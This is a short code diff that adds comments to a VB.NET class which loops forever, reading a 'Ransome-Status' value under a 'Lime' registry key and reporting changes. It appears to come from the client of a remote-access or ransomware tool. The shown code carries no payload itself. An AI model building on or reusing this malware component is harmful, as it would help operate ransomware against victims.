@@ -11,7 +11,11 @@ Public Class CHK_REG
 1:
         Try
 
-            While True
+            While True 'Infinity loop
+
+                'Compare old string with new string
+                'The client will old use send function IF the string has been changed
+
                 Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
                 If Old <> readValue.ToString Then
                     Old = readValue
@@ -26,7 +30,8 @@ Public Class CHK_REG
                     End If
                 End If
 
-                Thread.CurrentThread.Sleep(3000)
+
+                Thread.CurrentThread.Sleep(3000) 'sleep to reduce cpu usage
             End While
         Catch ex As Exception
             GoTo 1
